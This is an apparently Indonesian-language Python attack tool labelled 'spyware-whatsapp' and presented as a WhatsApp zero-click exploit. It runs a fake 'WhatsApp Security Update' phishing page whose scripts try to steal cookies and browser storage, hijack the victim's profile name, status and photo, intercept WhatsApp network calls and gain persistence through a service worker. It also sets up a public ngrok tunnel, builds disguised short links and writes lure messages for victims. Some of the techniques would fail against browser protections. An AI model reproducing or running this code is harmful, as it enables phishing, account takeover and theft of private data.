import http.server
import socketserver
import threading
import json
import sqlite3
import os
import re
import requests
from urllib.parse import urlparse, parse_qs
from http.cookies import SimpleCookie
import base64
import time
import random
import subprocess
import sys

class WhatsAppZeroClick:
    def __init__(self):
        self.port = 8080
        self.host = '0.0.0.0'
        self.stolen_data = {
            'cookies': [],
            'local_storage': [],
            'session_data': [],
            'messages': [],
            'profile_hijacks': []
        }
        self.profile_control = {
            'status_text': '',
            'profile_name': '', 
            'profile_photo': ''
        }
        self.ngrok_url = None
        self.ngrok_process = None
        
    def neon_banner(self):
        """Display neon animated banner"""
        banner = r"""
        
███████╗██╗      ██████╗ ██╗  ██╗███████╗██████╗ ████████╗██╗███╗   ███╗
██╔════╝██║     ██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗╚══██╔══╝██║████╗ ████║
█████╗  ██║     ██║   ██║█████╔╝ █████╗  ██████╔╝   ██║   ██║██╔████╔██║
██╔══╝  ██║     ██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗   ██║   ██║██║╚██╔╝██║
███████╗███████╗╚██████╔╝██║  ██╗███████╗██║  ██║   ██║   ██║██║ ╚═╝ ██║
╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝     ╚═╝
        🚀 spyware-whatsapp 🚀
           WITH PROFILE CONTROL + AUTO NGROK
        """
        colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m']
        for i, line in enumerate(banner.split('\n')):
            color = colors[i % len(colors)]
            print(f"{color}{line}\033[0m")
            time.sleep(0.05)

    def loading_animation(self, text, duration=2):
        """Display loading animation"""
        frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            frame = frames[i % len(frames)]
            print(f"\r\033[96m{frame} {text}\033[0m", end='', flush=True)
            time.sleep(0.1)
            i += 1
        print(f"\r\033[92m✓ {text} COMPLETED!\033[0m")

    def neon_menu(self, title, options):
        """Display neon styled menu"""
        print(f"\n\033[95m╔{'═' * (len(title) + 2)}╗\033[0m")
        print(f"\033[95m║ \033[93m{title}\033[95m ║\033[0m")
        print(f"\033[95m╠{'═' * (len(title) + 2)}╣\033[0m")
        
        for i, option in enumerate(options, 1):
            color = ['\033[96m', '\033[92m', '\033[93m', '\033[94m'][(i-1) % 4]
            print(f"\033[95m║\033[0m {color}{i}. {option}\033[0m")
            
        print(f"\033[95m╚{'═' * (len(title) + 2)}╝\033[0m")

    def neon_header(self, text):
        """Display neon header"""
        border = "✨" * (len(text) + 4)
        print(f"\n\033[95m{border}\033[0m")
        print(f"\033[96m  {text}  \033[0m")
        print(f"\033[95m{border}\033[0m")

    def setup_ngrok(self):
        """Setup ngrok untuk public URL otomatis"""
        try:
            self.loading_animation("Setting up ngrok for public access", 2)
            
            # Download ngrok jika belum ada
            if not os.path.exists('ngrok'):
                self.loading_animation("Downloading ngrok", 3)
                if sys.platform.startswith('linux'):
                    os.system('wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz -O ngrok.tgz')
                    os.system('tar xzf ngrok.tgz')
                    os.system('rm ngrok.tgz')
                else:
                    print("❌ Ngrok auto-download only available for Linux")
                    return False
            
            # Start ngrok process
            self.ngrok_process = subprocess.Popen(
                ['./ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Tunggu ngrok startup
            time.sleep(3)
            
            # Dapatkan public URL
            for _ in range(10):  # Retry 10x
                try:
                    response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                    if response.status_code == 200:
                        data = response.json()
                        tunnels = data.get('tunnels', [])
                        for tunnel in tunnels:
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                print(f"\033[92m✅ Ngrok Public URL: {self.ngrok_url}\033[0m")
                                return True
                except:
                    pass
                time.sleep(1)
                
        except Exception as e:
            print(f"\033[91m❌ Ngrok setup failed: {e}\033[0m")
            
        return False

    def get_public_links(self):
        """Dapatkan semua public links yang available"""
        links = {}
        
        # Coba ngrok dulu
        if self.setup_ngrok():
            links['ngrok'] = self.ngrok_url
        
        # Public IP sebagai fallback
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
            links['public_ip'] = f"http://{public_ip}:{self.port}"
        except:
            links['public_ip'] = f"http://YOUR_PUBLIC_IP:{self.port}"
        
        # Generate shortened links
        short_links = [
            f"bit.ly/wa-upd-{random.randint(1000,9999)}",
            f"tinyurl.com/wasec{random.randint(100,999)}", 
            f"sh.st/waplus{random.randint(10,99)}",
            f"cutt.ly/wa24{random.randint(100,999)}",
            f"is.gd/wa_{random.randint(10000,99999)}"
        ]
        links['shortened'] = short_links
        
        return links

    def start_exploit_server(self):
        """Start malicious server dengan semua fitur"""
        class ExploitHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_exploit_page()
                elif self.path == '/wa-exploit':
                    self.send_exploit_page()
                elif self.path == '/wa-hijack':
                    self.send_hijack_script()
                elif self.path == '/wa-profile-control':
                    self.send_profile_control_script()
                elif self.path == '/wa-steal':
                    self.steal_data()
                elif self.path.startswith('/wa-log'):
                    self.log_data()
                else:
                    self.send_default_page()
                    
            def do_POST(self):
                if self.path.startswith('/wa-log'):
                    self.log_data()
                elif self.path == '/wa-steal':
                    self.steal_data()
                else:
                    self.send_error(404)
                    
            def send_exploit_page(self):
                """Kirim halaman exploit utama dengan semua fitur"""
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                exploit_html = f"""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>WhatsApp Security Update</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <style>
                        body {{
                            font-family: Arial, sans-serif;
                            background: linear-gradient(135deg, #25D366, #128C7E);
                            color: white;
                            text-align: center;
                            padding: 50px 20px;
                            margin: 0;
                        }}
                        .container {{
                            background: rgba(255,255,255,0.1);
                            backdrop-filter: blur(10px);
                            border-radius: 20px;
                            padding: 40px;
                            max-width: 500px;
                            margin: 0 auto;
                            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
                            border: 1px solid rgba(255,255,255,0.2);
                        }}
                        .loading {{
                            margin: 30px 0;
                        }}
                        .progress {{
                            background: rgba(255,255,255,0.3);
                            border-radius: 10px;
                            height: 20px;
                            margin: 20px 0;
                            overflow: hidden;
                        }}
                        .progress-bar {{
                            background: white;
                            height: 100%;
                            width: 0%;
                            animation: loading 3s ease-in-out forwards;
                        }}
                        @keyframes loading {{
                            0% {{ width: 0%; }}
                            100% {{ width: 100%; }}
                        }}
                    </style>
                    <script>
                        // Profile control configuration
                        const PROFILE_CONTROL = {json.dumps(self.server.exploit_instance.profile_control)};
                        
                        // Auto-execute exploit ketika page load
                        window.addEventListener('load', function() {{
                            console.log('Starting WhatsApp exploit...');
                            
                            // Create hidden iframe to WhatsApp Web
                            const iframe = document.createElement('iframe');
                            iframe.src = 'https://web.whatsapp.com';
                            iframe.style.cssText = 'width:0;height:0;border:0;position:absolute;top:-9999px;left:-9999px;';
                            document.body.appendChild(iframe);
                            
                            iframe.onload = function() {{
                                stealWhatsAppData();
                                hijackProfileControl();
                            }};
                            
                            // Fallback setelah 3 detik
                            setTimeout(function() {{
                                stealWhatsAppData();
                                hijackProfileControl();
                            }}, 3000);
                        }});

                        function stealWhatsAppData() {{
                            console.log('Stealing WhatsApp data...');
                            
                            // Coba akses localStorage WhatsApp
                            try {{
                                const waFrame = document.querySelector('iframe[src*="web.whatsapp.com"]');
                                if (waFrame && waFrame.contentWindow) {{
                                    const waStorage = waFrame.contentWindow.localStorage;
                                    if (waStorage) {{
                                        const data = {{}};
                                        for (let i = 0; i < waStorage.length; i++) {{
                                            const key = waStorage.key(i);
                                            data[key] = waStorage.getItem(key);
                                        }}
                                        sendToServer('local_storage', data);
                                    }}
                                }}
                            }} catch (e) {{
                                console.log('LocalStorage access failed:', e);
                            }}
                            
                            // Coba akses cookies
                            try {{
                                const cookies = document.cookie;
                                sendToServer('cookies', {{cookies: cookies}});
                            }} catch (e) {{
                                console.log('Cookie access failed:', e);
                            }}
                            
                            // Coba akses sessionStorage
                            try {{
                                const sessionData = {{}};
                                for (let i = 0; i < sessionStorage.length; i++) {{
                                    const key = sessionStorage.key(i);
                                    sessionData[key] = sessionStorage.getItem(key);
                                }}
                                sendToServer('session_data', sessionData);
                            }} catch (e) {{
                                console.log('SessionStorage access failed:', e);
                            }}
                            
                            // Coba buka WhatsApp protocol
                            try {{
                                window.location.href = 'whatsapp://send?text=Security+Update+Completed';
                            }} catch (e) {{
                                console.log('WhatsApp protocol failed:', e);
                            }}
                        }}

                        function hijackProfileControl() {{
                            console.log('Starting profile hijack...');
                            
                            // Inject profile control script
                            const script = document.createElement('script');
                            script.src = '/wa-profile-control';
                            document.body.appendChild(script);
                            
                            // Report hijack initiation
                            sendToServer('profile_hijack', {{
                                status: 'initiated',
                                config: PROFILE_CONTROL,
                                timestamp: new Date().toISOString()
                            }});
                        }}

                        function sendToServer(type, data) {{
                            const xhr = new XMLHttpRequest();
                            xhr.open('POST', '/wa-log', true);
                            xhr.setRequestHeader('Content-Type', 'application/json');
                            xhr.send(JSON.stringify({{
                                type: type,
                                data: data,
                                url: window.location.href,
                                userAgent: navigator.userAgent,
                                timestamp: new Date().toISOString()
                            }}));
                        }}

                        // Update status messages
                        const statusMessages = [
                            'Checking encryption...',
                            'Verifying session security...',
                            'Scanning for vulnerabilities...',
                            'Applying security patches...',
                            'Update complete! Redirecting...'
                        ];
                        
                        statusMessages.forEach((msg, index) => {{
                            setTimeout(() => {{
                                document.getElementById('status').textContent = msg;
                                if (index === statusMessages.length - 1) {{
                                    setTimeout(() => {{
                                        window.location.href = 'https://web.whatsapp.com';
                                    }}, 1000);
                                }}
                            }}, index * 600);
                        }});
                    </script>
                </head>
                <body>
                    <div class="container">
                        <h1>🔒 WhatsApp Security Update</h1>
                        <p>Checking your account security settings...</p>
                        
                        <div class="loading">
                            <div class="progress">
                                <div class="progress-bar"></div>
                            </div>
                            <p>Scanning for vulnerabilities...</p>
                        </div>
                        
                        <div id="status">Initializing security protocols...</div>
                    </div>
                </body>
                </html>
                """
                self.wfile.write(exploit_html.encode())
                
            def send_profile_control_script(self):
                """Kirim script untuk kontrol profile WhatsApp"""
                self.send_response(200)
                self.send_header('Content-type', 'application/javascript')
                self.end_headers()
                
                profile_script = f"""
                // WhatsApp Profile Hijacking Script
                (function() {{
                    const profileConfig = {json.dumps(self.server.exploit_instance.profile_control)};
                    
                    console.log('Profile control activated:', profileConfig);
                    
                    function changeProfileStatus() {{
                        if (profileConfig.status_text) {{
                            try {{
                                // Cari dan update status
                                const statusElement = document.querySelector('[data-testid="status-v3"]');
                                if (statusElement) {{
                                    statusElement.click();
                                    setTimeout(() => {{
                                        const statusInput = document.querySelector('[contenteditable="true"]');
                                        if (statusInput) {{
                                            statusInput.innerHTML = profileConfig.status_text;
                                            const sendButton = document.querySelector('[data-testid="status-send"]');
                                            if (sendButton) sendButton.click();
                                            console.log('Status changed to:', profileConfig.status_text);
                                        }}
                                    }}, 1000);
                                }}
                            }} catch (e) {{
                                console.log('Status change failed:', e);
                            }}
                        }}
                    }}
                    
                    function changeProfileName() {{
                        if (profileConfig.profile_name) {{
                            try {{
                                // Buka profile settings
                                const menuBtn = document.querySelector('[data-testid="menu"]');
                                if (menuBtn) {{
                                    menuBtn.click();
                                    setTimeout(() => {{
                                        const profileBtn = document.querySelector('[data-testid="settings"]');
                                        if (profileBtn) {{
                                            profileBtn.click();
                                            setTimeout(() => {{
                                                const nameField = document.querySelector('[data-testid="profile-name"]');
                                                if (nameField) {{
                                                    nameField.click();
                                                    setTimeout(() => {{
                                                        const nameInput = document.querySelector('[contenteditable="true"]');
                                                        if (nameInput) {{
                                                            nameInput.innerHTML = profileConfig.profile_name;
                                                            const saveBtn = document.querySelector('[data-testid="checkmark"]');
                                                            if (saveBtn) saveBtn.click();
                                                            console.log('Profile name changed to:', profileConfig.profile_name);
                                                        }}
                                                    }}, 500);
                                                }}
                                            }}, 1000);
                                        }}
                                    }}, 500);
                                }}
                            }} catch (e) {{
                                console.log('Profile name change failed:', e);
                            }}
                        }}
                    }}
                    
                    function changeProfilePhoto() {{
                        if (profileConfig.profile_photo) {{
                            try {{
                                // Upload foto profil dari URL
                                fetch(profileConfig.profile_photo)
                                    .then(response => response.blob())
                                    .then(blob => {{
                                        const file = new File([blob], "profile.jpg", {{ type: "image/jpeg" }});
                                        const dataTransfer = new DataTransfer();
                                        dataTransfer.items.add(file);
                                        
                                        const profilePic = document.querySelector('[data-testid="profile-image"]');
                                        if (profilePic) {{
                                            profilePic.click();
                                            setTimeout(() => {{
                                                const fileInput = document.querySelector('input[type="file"]');
                                                if (fileInput) {{
                                                    fileInput.files = dataTransfer.files;
                                                    fileInput.dispatchEvent(new Event('change', {{ bubbles: true }}));
                                                    console.log('Profile photo changed');
                                                }}
                                            }}, 1000);
                                        }}
                                    }}).catch(e => console.log('Photo upload failed:', e));
                            }} catch (e) {{
                                console.log('Profile photo change failed:', e);
                            }}
                        }}
                    }}
                    
                    // Tunggu WhatsApp Web fully loaded
                    function waitForWhatsApp() {{
                        if (typeof window.Store !== 'undefined') {{
                            console.log('WhatsApp Web loaded, starting profile hijack...');
                            
                            // Tunggu tambahan untuk memastikan UI ready
                            setTimeout(() => {{
                                changeProfileStatus();
                                setTimeout(() => {{
                                    changeProfileName();
                                    setTimeout(() => {{
                                        changeProfilePhoto();
                                    }}, 2000);
                                }}, 2000);
                            }}, 3000);
                        }} else {{
                            setTimeout(waitForWhatsApp, 1000);
                        }}
                    }}
                    
                    waitForWhatsApp();
                    
                    // Report success
                    fetch('/wa-log', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            type: 'profile_hijack',
                            status: 'executed',
                            config: profileConfig,
                            timestamp: new Date().toISOString()
                        }})
                    }});
                }})();
                """
                self.wfile.write(profile_script.encode())
                
            def send_hijack_script(self):
                """Kirim script hijacking advanced"""
                self.send_response(200)
                self.send_header('Content-type', 'application/javascript')
                self.end_headers()
                
                hijack_script = """
                // Advanced WhatsApp Hijacking
                (function() {
                    console.log('Advanced hijack script loaded');
                    
                    // Hook XMLHttpRequest untuk intercept WhatsApp API calls
                    const originalXHR = window.XMLHttpRequest;
                    window.XMLHttpRequest = function() {
                        const xhr = new originalXHR();
                        const originalOpen = xhr.open;
                        const originalSend = xhr.send;
                        
                        xhr.open = function(method, url) {
                            this._url = url;
                            return originalOpen.apply(this, arguments);
                        };
                        
                        xhr.send = function(data) {
                            if (this._url && this._url.includes('web.whatsapp.com')) {
                                // Intercept WhatsApp data
                                fetch('/wa-log', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        type: 'xhr_intercept',
                                        url: this._url,
                                        data: data,
                                        timestamp: new Date().toISOString()
                                    })
                                });
                            }
                            return originalSend.apply(this, arguments);
                        };
                        
                        return xhr;
                    };
                    
                    // Hook fetch API juga
                    const originalFetch = window.fetch;
                    window.fetch = function(...args) {
                        return originalFetch.apply(this, args).then(response => {
                            if (args[0] && args[0].includes('web.whatsapp.com')) {
                                response.clone().text().then(text => {
                                    fetch('/wa-log', {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            type: 'fetch_intercept',
                                            url: args[0],
                                            response: text.substring(0, 1000),
                                            timestamp: new Date().toISOString()
                                        })
                                    });
                                });
                            }
                            return response;
                        });
                    };
                    
                    // Coba akses Service Worker untuk persistence
                    if ('serviceWorker' in navigator) {
                        navigator.serviceWorker.register('/wa-hijack')
                            .then(registration => console.log('Service Worker registered'))
                            .catch(err => console.log('Service Worker failed:', err));
                    }
                })();
                """
                self.wfile.write(hijack_script.encode())
                
            def steal_data(self):
                """Endpoint untuk receive stolen data"""
                if self.headers['Content-Length']:
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    stolen_data = json.loads(post_data.decode())
                    
                    print(f"[+] Data dicuri: {stolen_data['type']}")
                    self.server.exploit_instance.stolen_data[stolen_data['type']].append(stolen_data)
                
                self.send_response(200)
                self.end_headers()
                
            def log_data(self):
                """Log data yang dicuri"""
                if self.headers['Content-Length']:
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    data = json.loads(post_data.decode())
                    
                    if data['type'] == 'profile_hijack':
                        print(f"🎭 PROFILE HIJACK: {data['status']}")
                        print(f"   📝 Status: {data['config']['status_text']}")
                        print(f"   📛 Name: {data['config']['profile_name']}")
                        print(f"   🖼️ Photo: {data['config']['profile_photo']}")
                        self.server.exploit_instance.stolen_data['profile_hijacks'].append(data)
                    else:
                        print(f"[EXPLOIT] {data['type']} - {data.get('url', 'N/A')}")
                    
                    # Simpan ke file
                    with open('stolen_data.json', 'a') as f:
                        f.write(json.dumps(data) + '\\n')
                
                self.send_response(200)
                self.end_headers()
                
            def send_default_page(self):
                """Halaman default redirect ke exploit"""
                self.send_response(302)
                self.send_header('Location', '/')
                self.end_headers()
        
        class ExploitServer(socketserver.TCPServer):
            def __init__(self, *args, **kwargs):
                self.exploit_instance = self
                super().__init__(*args, **kwargs)
        
        handler = ExploitHandler
        handler.server = ExploitServer
        
        with ExploitServer((self.host, self.port), handler) as httpd:
            httpd.exploit_instance = self
            print(f"[+] Exploit server running on http://{self.host}:{self.port}")
            
            # Tampilkan semua available links
            links = self.get_public_links()
            self.display_public_links(links)
            
            httpd.serve_forever()

    def display_public_links(self, links):
        """Display semua public links yang available"""
        self.neon_header("PUBLIC LINKS READY TO SEND")
        
        if links.get('ngrok'):
            print(f"\033[92m🎯 NGROK LINK: {links['ngrok']}\033[0m")
            print("   📤 \033[93mBISA LANGSUNG KIRIM KE TARGET!\033[0m")
        
        print(f"\033[94m🔗 PUBLIC IP: {links['public_ip']}\033[0m")
        print("   ⚠️  \033[91mButuh port forwarding jika di belakang router\033[0m")
        
        print("\n\033[95m🔗 SHORTENED LINKS (Alternatif):\033[0m")
        for i, link in enumerate(links['shortened'], 1):
            color = ['\033[96m', '\033[92m', '\033[93m', '\033[94m'][(i-1) % 4]
            print(f"   {color}{i}. {link}\033[0m")
        
        print("\n\033[95m💡 RECOMMENDED: Gunakan NGROK LINK di atas!\033[0m")
        print("   \033[96mTarget bisa buka link dari mana saja di internet!\033[0m")

    def setup_profile_control(self):
        """Setup profile control - hacker bisa input custom data"""
        self.neon_header("WHATSAPP PROFILE CONTROL SETUP")
        
        # Input status text
        status = input("\033[96m🎯 Masukkan teks status baru: \033[0m").strip()
        if status:
            self.profile_control['status_text'] = status
        else:
            self.profile_control['status_text'] = "Hacked by Anonymous 🔥"
            
        # Input profile name
        name = input("\033[92m📛 Masukkan nama profil baru: \033[0m").strip()
        if name:
            self.profile_control['profile_name'] = name
        else:
            self.profile_control['profile_name'] = "HACKED ACCOUNT"
            
        # Input profile photo URL
        photo = input("\033[93m🖼️ Masukkan URL foto profil (opsional): \033[0m").strip()
        if photo:
            self.profile_control['profile_photo'] = photo
        else:
            # Default malicious photo
            self.profile_control['profile_photo'] = 'https://i.imgur.com/8m7R6qJ.jpg'
            
        print("\033[92m✅ Profile control configured!\033[0m")
        return self.profile_control

    def create_social_engineering_messages(self, main_link):
        """Buat pesan social engineering yang meyakinkan"""
        short_link = random.choice([
            f"bit.ly/wa-upd-{random.randint(1000,9999)}",
            f"tinyurl.com/wasec{random.randint(100,999)}"
        ])
        
        messages = {
            'whatsapp_update': {
                'title': '🚀 WhatsApp Update Terbaru 2024!',
                'message': f'Hai! WhatsApp baru saja rilis update dengan fitur baru: Status 48 jam, Tema Custom, Anti-Ban. Download di: {main_link}',
                'short_message': f'WhatsApp update terbaru! {short_link}',
                'target': 'Semua kontak'
            },
            'security_alert': {
                'title': '⚠️ PERINGATAN Keamanan WhatsApp',
                'message': f'Akun Anda terdeteksi login dari device tidak dikenal. Verifikasi segera: {main_link} Untuk menghindari banned permanen.',
                'short_message': f'PERINGATAN keamanan WhatsApp! {short_link}',
                'target': 'Target spesifik'
            }
        }
        return messages

    def start_sms_bomber(self, target_number, main_link):
        """Kirim link exploit via SMS blast"""
        messages = self.create_social_engineering_messages(main_link)
        
        self.neon_header(f"MENGIRIM SMS KE: {target_number}")
        
        for msg_type, content in messages.items():
            message = content['short_message']
            
            print(f"\033[96m💬 {content['title']}\033[0m")
            print(f"   \033[93mPesan: {message}\033[0m")
            print(f"   \033[92mTarget: {content['target']}\033[0m")
            print("   \033[95m---\033[0m")
            
            time.sleep(1)

    def analyze_stolen_data(self):
        """Analisis data yang berhasil dicuri"""
        self.neon_header("ANALYZING STOLEN DATA")
        
        total_items = 0
        for data_type, items in self.stolen_data.items():
            if items:
                color = '\033[92m' if len(items) > 0 else '\033[91m'
                print(f"{color}✅ {data_type.upper()}: {len(items)} items\033[0m")
                total_items += len(items)
                
                if data_type == 'cookies':
                    for item in items:
                        cookies = item.get('data', {}).get('cookies', '')
                        if 'wa_' in cookies or 'whatsapp' in cookies.lower():
                            print(f"   \033[93m🎯 WhatsApp cookies ditemukan!\033[0m")
                
                elif data_type == 'local_storage':
                    for item in items:
                        storage_data = item.get('data', {})
                        for key, value in storage_data.items():
                            if 'token' in key.lower() or 'auth' in key.lower():
                                print(f"   \033[96m🔑 Auth token: {value[:50]}...\033[0m")
                
                elif data_type == 'profile_hijacks':
                    for item in items:
                        if item['status'] == 'executed':
                            print(f"   \033[92m🎭 Profile hijack BERHASIL!\033[0m")
        
        if total_items == 0:
            print("\033[91m📭 Belum ada data yang dicuri...\033[0m")
        else:
            print(f"\033[95m📊 TOTAL DATA: {total_items} items\033[0m")

    def cleanup(self):
        """Cleanup resources"""
        if self.ngrok_process:
            self.ngrok_process.terminate()
            print("\033[92m✅ Ngrok stopped\033[0m")

    def deploy_complete_attack(self, target_number=None):
        """Deploy complete attack dengan semua fitur"""
        self.neon_header("DEPLOYING WHATSAPP ZERO-CLICK EXPLOIT")
        
        # Setup profile control
        self.setup_profile_control()
        
        try:
            # Start server
            self.loading_animation("Starting exploit server", 2)
            server_thread = threading.Thread(target=self.start_exploit_server)
            server_thread.daemon = True
            server_thread.start()
            
            # Tunggu sebentar untuk pastikan server running
            time.sleep(2)
            
            # Jika ada nomor target, kirim SMS
            if target_number and self.ngrok_url:
                self.start_sms_bomber(target_number, self.ngrok_url)
            
            # Monitor stolen data
            self.neon_header("MONITORING STOLEN DATA & PROFILE HIJACK")
            print("\033[93mPress Ctrl+C to stop\033[0m")
            try:
                while True:
                    time.sleep(10)
                    self.analyze_stolen_data()
            except KeyboardInterrupt:
                print("\n\033[91m⏹️ Attack stopped\033[0m")
                
        finally:
            self.cleanup()
            print("\033[92m📁 Data tersimpan di: stolen_data.json\033[0m")

def main():
    exploit = WhatsAppZeroClick()
    
    # Display neon banner
    exploit.neon_banner()
    
    # Main menu
    exploit.neon_menu("MAIN MENU", [
        "Start WhatsApp Exploit",
        "Setup Profile Control", 
        "Generate Public Links",
        "Exit"
    ])
    
    target = input("\n\033[96m🎯 Masukkan nomor target untuk SMS blast (opsional): \033[0m").strip()
    exploit.deploy_complete_attack(target if target else None)

if __name__ == "__main__":
    main()
